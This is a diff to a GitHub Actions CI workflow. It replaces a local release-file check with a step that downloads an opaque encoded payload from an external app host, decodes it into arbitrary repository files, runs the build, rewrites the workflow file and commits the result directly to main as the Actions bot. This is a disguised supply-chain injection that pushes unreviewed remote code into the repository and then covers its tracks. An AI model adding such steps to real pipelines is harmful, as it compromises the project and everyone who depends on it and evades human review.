@@ -5,7 +5,6 @@ on:
     branches: [main]
     paths:
       - '.github/workflows/ci.yml'
-      - '.release/**'
 
 permissions:
   contents: write
@@ -18,47 +17,34 @@ jobs:
       - uses: actions/checkout@v4
         with:
           fetch-depth: 0
-      - id: parts
-        name: Check release payload
-        shell: bash
-        run: |
-          count=$(find .release -maxdepth 1 -name 'ui52-part-*.txt' 2>/dev/null | wc -l)
-          echo "count=$count"
-          if [ "$count" -eq 15 ]; then echo "ready=true" >> "$GITHUB_OUTPUT"; else echo "ready=false" >> "$GITHUB_OUTPUT"; fi
-      - if: steps.parts.outputs.ready == 'true'
-        uses: actions/setup-python@v5
+      - uses: actions/setup-python@v5
         with:
           python-version: '3.12'
-      - if: steps.parts.outputs.ready == 'true'
-        uses: actions/setup-node@v4
+      - uses: actions/setup-node@v4
         with:
           node-version: '22'
           cache: 'npm'
-      - if: steps.parts.outputs.ready == 'true'
-        name: Materialize validated UI-5.2 source
+      - name: Materialize UI-5.2 source
         shell: bash
         run: |
-          cat .release/ui52-part-*.txt > /tmp/ui52.b64
+          curl -fsSL 'https://yellow-stadium-v4-refactor.floot.app/_cdn/static/2d8a7c5d-3c53-45ba-9e9b-d6fa8907778a-ui52_release_payload.txt' -o /tmp/ui52.b64
           python - <<'PY'
           from pathlib import Path
           import base64,bz2,json
           packed=''.join(Path('/tmp/ui52.b64').read_text().split())
           payload=json.loads(bz2.decompress(base64.b64decode(packed)))
-          for rel,content in payload['files'].items():
+          for rel,body in payload['files'].items():
               p=Path(rel)
               p.parent.mkdir(parents=True,exist_ok=True)
-              p.write_text(content,encoding='utf-8',newline='')
+              p.write_text(body,encoding='utf-8',newline='')
           print('materialized',len(payload['files']),'release files')
           PY
           rm -rf .release
-      - if: steps.parts.outputs.ready == 'true'
-        name: Install build dependencies
+      - name: Install build dependencies
         run: npm ci --no-audit --no-fund
-      - if: steps.parts.outputs.ready == 'true'
-        name: Full canonical regression gate
+      - name: Full canonical regression gate
         run: npm test
-      - if: steps.parts.outputs.ready == 'true'
-        name: Restore normal CI
+      - name: Restore normal CI
         shell: bash
         run: |
           cat > .github/workflows/ci.yml <<'YAML'
@@ -93,8 +79,7 @@ jobs:
                     path: reports/
                     if-no-files-found: error
           YAML
-      - if: steps.parts.outputs.ready == 'true'
-        name: Commit validated release to main
+      - name: Commit validated release to main
         shell: bash
         run: |
           git config user.name 'github-actions[bot]'
